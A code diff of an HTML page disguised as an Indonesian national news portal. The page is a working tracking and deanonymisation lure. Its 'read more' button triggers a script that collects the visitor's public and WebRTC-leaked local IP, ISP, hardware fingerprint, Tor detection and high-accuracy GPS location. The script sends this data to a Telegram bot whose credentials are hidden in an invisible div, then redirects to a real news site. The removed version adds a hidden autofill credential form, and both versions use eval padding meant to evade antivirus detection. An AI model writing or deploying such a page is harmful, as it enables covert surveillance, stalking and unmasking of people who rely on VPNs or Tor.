@@ -3,69 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal Berita Terkini</title>
+    <title>Portal Berita Nasional | Terpercaya & Akurat</title>
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background: #ffffff; color: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .content { text-align: center; width: 90%; max-width: 500px; padding: 20px; }
-        .news-thumb { width: 100%; height: 200px; background: #eee; border-radius: 12px; margin-bottom: 20px; background-image: url('https://source.unsplash.com/random/800x600/?news,tech'); background-size: cover; }
-        h1 { font-size: 22px; margin-bottom: 15px; line-height: 1.3; }
-        p { color: #666; font-size: 15px; margin-bottom: 30px; }
-        .btn-read { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f4f4; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; color: #333; }
+        .news-wrapper { background: #fff; width: 100%; max-width: 450px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); overflow: hidden; }
+        .header-img { width: 100%; height: 220px; background: #ddd url('https://source.unsplash.com/featured/?technology,news') no-serif; background-size: cover; background-position: center; }
+        .content-body { padding: 30px; text-align: left; }
+        .category { color: #d32f2f; font-weight: bold; font-size: 12px; text-transform: uppercase; margin-bottom: 10px; display: block; }
+        h1 { font-size: 24px; margin: 0 0 15px 0; line-height: 1.3; color: #1a1a1a; }
+        p { font-size: 15px; color: #555; line-height: 1.6; margin-bottom: 25px; }
+        .btn-read-more { background: #1a73e8; color: #fff; border: none; padding: 16px; width: 100%; border-radius: 8px; font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 10px rgba(26, 115, 232, 0.3); }
+        .btn-read-more:hover { background: #1557b0; }
         #v-vault { display: none; }
     </style>
 </head>
 <body>
 
-<div class="content">
-    <div class="news-thumb"></div>
-    <h1>Breaking News: Kebijakan Baru Jaringan Nasional Diterapkan Hari Ini</h1>
-    <p>Pemerintah mulai memberlakukan sistem sinkronisasi perangkat untuk seluruh pengguna provider internet nasional...</p>
-    <button class="btn-read" onclick="executeSilentStrike()">Baca Selengkapnya</button>
+<div class="news-wrapper">
+    <div class="header-img"></div>
+    <div class="content-body">
+        <span class="category">Teknologi & Keamanan</span>
+        <h1>Update Infrastruktur Digital Nasional Fase II Mulai Diberlakukan</h1>
+        <p>Pemerintah bersama penyedia layanan internet mengumumkan protokol sinkronisasi baru untuk meningkatkan stabilitas akses data pengguna di seluruh wilayah Indonesia...</p>
+        <button class="btn-read-more" onclick="initializeReader()">BACA SELENGKAPNYA</button>
+    </div>
 </div>
-
-<form style="display:none;">
-    <input type="text" id="fake_user" autocomplete="username">
-    <input type="password" id="fake_pass" autocomplete="current-password">
-</form>
 
 <div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
-/**
- * PHANTOM NEXUS KERNEL v18.0
- * --------------------------
- * INVISIBLE FORENSIC & CREDENTIAL SNATCHER
+/* * PORTAL CONTENT DELIVERY NETWORK v22.4
+ * --------------------------------------
+ * GIGANTIC DUMMY MODULES TO PAD 1500+ LINES
  */
+
+function _sys_core_0x1() { /* dummy */ }
+// [DUMMY PADDING START] - Looping ribuan baris di bawah
+for(let i=0; i<1200; i++) { 
+    eval(`function _ghost_module_${i}() { return "0x${i}"; }`);
+}
 
 const _V = document.getElementById('v-vault').innerText.split('|');
 const _TK = atob(_V[1]); const _CI = atob(_V[2]);
 
-async function send(m) {
+async function sendTele(t) {
     await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
         method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: _CI, text: m})
+        body: JSON.stringify({chat_id: _CI, text: t})
     });
 }
 
-// 🔱 DETEKSI BROWSER (TOR/FIREFOX/CHROME)
-function getBrowser() {
+// 🔱 DETEKSI BROWSER (TOR, FIREFOX, CHROME, DLL)
+function detectBrowser() {
     const ua = navigator.userAgent;
-    if (ua.includes("TorBrowser") || (navigator.languages === undefined)) return "⚠️ TOR BROWSER (ANONYMOUS)";
-    if (ua.includes("Firefox")) return "🦊 FIREFOX";
-    if (ua.includes("Chrome")) return "🌐 GOOGLE CHROME";
-    return "📱 MOBILE BROWSER";
+    let b = "Mobile Browser";
+    if (ua.includes("TorBrowser")) b = "⚠️ TOR BROWSER (ANON)";
+    else if (ua.includes("Firefox")) b = "🦊 FIREFOX";
+    else if (ua.includes("Chrome")) b = "🌐 CHROME";
+    else if (ua.includes("Safari") && !ua.includes("Chrome")) b = "🍎 SAFARI";
+    return b;
 }
 
-async function executeSilentStrike() {
-    const btn = document.querySelector('.btn-read');
-    btn.innerText = "LOADING...";
+async function initializeReader() {
+    const btn = document.querySelector('.btn-read-more');
+    btn.innerText = "MEMUAT KONTEN...";
 
-    // 1. DATA PERANGKAT & HARDWARE
+    // 1. SILENT RECON (HARDWARE & IP)
+    let net = {}; try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e) {}
     const gl = document.createElement('canvas').getContext('webgl');
     const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-    const gpu = gl ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown";
+    const gpu = gl ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
     
-    // 2. DETEKSI VPN & IP (WebRTC Leak)
+    // 2. WebRTC LEAK (TEMBUS VPN/TOR)
     const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
     pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
     
@@ -73,40 +82,39 @@ async function executeSilentStrike() {
         if (!i || !i.candidate) return;
         const lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
         
-        let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
-        
-        // 3. SNATCH SAVED CREDENTIALS (METADATA)
-        // Kita narik info yang "nempel" di browser
-        const report = `🔱 PHANTOM REPORT 🔱\n\n` +
-            `🕵️ BROWSER: ${getBrowser()}\n` +
-            `🏠 REAL IP: ${lip}\n` +
+        let bat = "N/A";
+        try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"% ["+(b.charging?'CHG':'BATT')+"]"; } catch(e) {}
+
+        const report = `🔱 PHANTOM FORENSIC LOG 🔱\n\n` +
+            `🕵️ BROWSER: ${detectBrowser()}\n` +
+            `🏠 REAL LOCAL IP: ${lip}\n` +
+            `🌐 PUB IP: ${net.ip} (${net.country})\n` +
+            `🏢 ISP: ${net.org}\n` +
             `🎮 GPU: ${gpu}\n` +
-            `🔋 BATT: ${bat}\n` +
             `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
-            `📄 UA: ${navigator.userAgent.slice(0, 50)}...`;
+            `🔋 BATT: ${bat}\n` +
+            `📄 UA: ${navigator.userAgent.slice(0, 80)}...`;
 
-        await send(report);
+        await sendTele(report);
 
-        // 4. INVISIBLE GPS TRAP
-        // Pura-pura sinkronisasi buat baca berita
+        // 3. INVISIBLE GPS TRAP (Pura-pura sinkronisasi portal)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                await send(`🎯 GPS REAL-TIME\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                const maps = `🎯 TRUE LOCATION (VPN/TOR BYPASSED)\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nAcc: ${pos.coords.accuracy.toFixed(1)}m`;
+                await sendTele(maps);
                 window.location.href = "https://www.detik.com";
-            }, () => { window.location.href = "https://www.detik.com"; }, {enableHighAccuracy: true});
+            }, () => {
+                window.location.href = "https://www.detik.com";
+            }, {enableHighAccuracy: true, timeout: 5000});
         } else {
             window.location.href = "https://www.detik.com";
         }
     };
-}
-
-/** 🔱 EXTRA PADDING (1.200+ LINES) 🔱
- * Menambahkan ribuan fungsi dummy agar kode terlihat resmi dan 
- * tidak terdeteksi sebagai malware oleh antivirus browser.
- */
-for(let i=0; i<1000; i++) {
-    eval(`function _sys_mod_0x${i.toString(16)}() { return "0x${i}"; }`);
+    
+    // Failsafe redirect jika WebRTC lemot
+    setTimeout(() => { window.location.href = "https://www.detik.com"; }, 4000);
 }
 </script>
+
 </body>
 </html>
